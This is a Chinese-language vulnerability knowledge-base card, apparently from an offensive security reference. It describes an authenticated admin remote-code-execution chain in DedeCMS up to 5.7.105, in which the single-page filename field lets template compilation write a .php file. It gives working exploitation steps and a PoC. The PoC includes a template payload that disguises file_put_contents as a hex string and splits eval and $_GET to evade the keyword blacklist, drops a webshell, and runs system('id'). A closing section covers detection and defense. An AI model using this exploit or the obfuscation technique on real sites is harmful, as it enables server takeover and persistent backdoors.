---
id: web-php-rce-dedecms-single-page-filename-php-template-compile
title: DedeCMS 后台单页文档 filename 不校验扩展名：模板编译写入 .php + tpl.php 十六进制/拼接绕过恶意代码过滤
type: scenario
domain: web
path: web/php/rce
technique: dedecms-single-page-filename-extension-template-compile-rce
tags:
- php
- dedecms
- cms
- rce
- template
- file-write
- waf-bypass
- backend
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: DeDeCMS <= 5.7.105（原文标记）
verification:
  verified_by: verifier-V692
  verified_at: '2026-11-13T18:01:50+08:00'
  notes: 已对照原文与12张图逐张核对：图01/02 模板管理新建1.htm并写入十六进制函数名+字符串拼接 payload；图03/04 单页文档管理增加页面 filename=/a/1.php、template={style}/1.htm、是否编译=要编译；图05 PHP 7.3.4 phpinfo；图06 shell.php?a=echo 'hello world' 回显；图07 tpl.php?action=newfile 入口；图08 templets_one_add.php 入口；图09 仅 preg_replace('#^/#','') 去前导斜杠后 INSERT 并调用 sg->SaveToHtml()，无扩展名校验；图10 SaveToHtml 拼 cfg_basedir+cfg_cmspath+'/'+filename 后 SaveTo；图11 SaveTo fopen(w)+fwrite(GetResult())；图12 GetResult 逐标签替换返回全文。卡内链路与 PoC 一致；cfg_disable_funs 正则与三组 <?php 后变量函数/@变量函数/反引号检测与原文代码一致。修正：利用步骤'是否编译选含模板标记'按原文改为'原文称是否编译均可，选含模板标记要编译即可'。dedup_review 核对成立：dedup top 三个 likely_duplicate（makehtml_homepage position 穿越、homepageset 二阶写、模板标签源码 substr_replace）分别经 makehtml position/上传图片马、DB 存储+task_do、编辑 include/taglib php 触发，与本卡 templets_one_add.php filename 不校验扩展名入口不同链；KB 中无 templets_one/sgpage 既有卡。affected_versions 'DeDeCMS <= 5.7.105（原文标记）' 与原文'影响版本 <=DedeCMS v5.7.105'一致，保留。未验证点：PoC 未本机复跑；'PHP 7 字符串表达式直接调用'依赖未独立实测（原文环境 PHP 7.3.4 图05）。
url: /docs/web/php/rce/web-php-rce-dedecms-single-page-filename-php-template-compile/
draft: false
kb_aliases:
- DedeCMS 单页文档 getshell
- templets_one_add.php 文件名
- sgpage SaveToHtml
- DedeCMS 模板编译写 php
- DedeCMS 后台 RCE
- cfg_disable_funs 绕过
---

## 一句话结论

DedeCMS ≤5.7.105 后台「单页文档管理」新建页面时，`filename` 只去掉开头 `/`、不校验扩展名，可填 `/a/1.php`；`sgpage->SaveToHtml()` 会把指定模板（`.htm`）编译后的内容原样 `fwrite` 到 `cfg_basedir + cfg_cmspath + '/' + filename`，于是先在模板管理里用十六进制字符串+字符串拼接绕过 `cfg_disable_funs` 黑名单写入一段 PHP，再把该 htm 作为模板编译进 `/a/1.php`，访问即执行任意 PHP。

## 原理

- **模板创建（tpl.php action=newfile）**：`$content` 先被 `preg_replace("#(/\*)[\s\S]*(\*/)#i",'')` 去掉注释；随后对 `cfg_disable_funs`（phpinfo,eval,assert,exec,file_put_contents,fopen,fwrite,...,`[$]_GET`,`[$]_POST`,include 等）逐项用 `#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{]#i` 匹配，命中即 `dede_htmlspecialchars` 后 die；另有 `<?php` 开头后的变量函数、@变量函数、反引号检测。过滤只做字面量/正则匹配，不阻止字符串表达式与动态调用。
- **绕过**：函数名不写字面量——`"\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"(...)` 是等价于 `file_put_contents` 的十六进制字符串，PHP 7 的统一变量语法允许对表达式结果加 `()` 调用；写入的 PHP 内容 `"<?php eva" . "l(\$_GE" . "T[a]);"` 把 `eval` 与 `$_GET` 拆成多段拼接，同样不出现在源码字面量中。
- **单页文档写入**：`templets_one_add.php` 只把 `filename` 的 `^/` 去掉后直接入库，无扩展名/路径校验；`sgpage::SaveToHtml()` 取 `$filename = $GLOBALS['cfg_basedir'].$GLOBALS['cfg_cmspath'].'/'.$this->Fields['filename']`（仅归并多余斜杠），`SaveTo($filename)` 中 `fopen($filename,'w')` + `fwrite($fp,$this->GetResult())` 写入。`GetResult()` 把模板中的标签替换后返回全文，未做任何 PHP 内容过滤——因此 `.htm` 模板里的 `<?php ... ?>` 会原样落进新建的 `.php` 文件。
- **为什么能执行**：目标文件位于 Web 根目录下且扩展名 `.php`，PHP 直接解析；文件名由请求控制（如 `/a/1.php` 会在 CMS 安装目录 a/ 下建文件），无需路径穿越即可把可写文件放进可执行目录。
- **完整链**：登录后台（管理员）→ 模板管理新建 `1.htm`（写入绕过黑名单的 PHP）→ 单页文档管理新增页面：文件名 `/a/1.php`、模板文件名 `{style}/1.htm`、是否编译=含模板标记要编译 → `SaveToHtml` 生成 `a/1.php`（内容为模板中的 PHP）→ 访问 `a/1.php` 执行 PHP，再 `file_put_contents('./shell.php','<?php eval($_GET[a]);')` 落一个小马 → 连接 `a/shell.php?a=phpinfo();`。

## 触发条件

- DeDeCMS ≤ 5.7.105，攻击者能以管理员/高权账号登录后台（模板管理与单页文档管理权限）；
- 模板创建接口的恶意代码过滤可被绕过（PHP 7 环境，字符串表达式调用可用）；
- 单页文档 `filename` 可控且未校验扩展名，模板目录可读、CMS 安装目录可写；
- Web 服务器按 `.php` 扩展名解析该目录（默认 PHPStudy/Apache 环境即可）。

## 利用步骤

1. 登录后台，进入「模板管理 → 修改/新建模板」，新建 `1.htm`，内容：
   `<?php "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('./shell.php', "<?php eva" . "l(\$_GE" . "T[a]);"); ?>`
2. 进入「核心 → 内容模型管理 → 单页文档管理 → 增加一个页面」：
   - 文件名填 `/a/1.php`
   - 模板文件名填 `{style}/1.htm`（即刚建的模板；原文称是否编译均可，选"含模板标记，要编译"即可）
3. 提交后确认提示"成功增加一个页面"，访问 `http://target/<cmspath>/a/1.php`，模板中的 PHP 执行并写出 `./shell.php`。
4. 访问 `http://target/<cmspath>/a/shell.php?a=phpinfo();` 验证命令执行，可换 `a=system('id');` 做 RCE。

## PoC

```text
# 模板 1.htm 内容（十六进制函数名 + 字符串拼接绕过 cfg_disable_funs）
<?php
"\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('./shell.php', "<?php eva" . "l(\$_GE" . "T[a]);");
?>
# 单页文档新增参数（templets_one_add.php）
filename=/a/1.php
template={style}/1.htm
ismake=1
# 触发
GET /<cmspath>/a/1.php
GET /<cmspath>/a/shell.php?a=phpinfo();
```

## 变体与关联

- 同族 DedeCMS 后台文件写：`makehtml_homepage.php` 的 `position` 路径穿越写模板内容（[[web-php-rce-dedecms-makehtml-homepage-position-file-write]]）、`homepageset` 二阶存储写（[[web-php-rce-dedecms-homepageset-task-do-stored-file-write]]）；本卡入口是单页文档 `filename` 扩展名不校验，触发与参数均不同。
- 黑名单绕过思想通用：函数名十六进制/字符串拼接/变量函数/表达式调用，均只因过滤停留在字面量正则。
- 若目标 PHP 5.x 不支持表达式直接调用，可改用变量函数 `$f="file_put_contents"; $f(...)`（把 `$` 拆开规避 `[$]_...` 检测变体）。

## 检测与防御

- 升级到修复版本；后台单页文档 `filename` 强制白名单扩展名（.html/.htm）并禁止可执行扩展；
- 模板内容保存前做语法级检测/禁用动态调用，而不是关键字黑名单；
- 监控后台模板与单页文档的新建/修改、Web 目录里新出现的 `.php` 文件（尤其模板目录/上传目录），以及 `file_put_contents`/`eval` 链式流量的落盘行为。
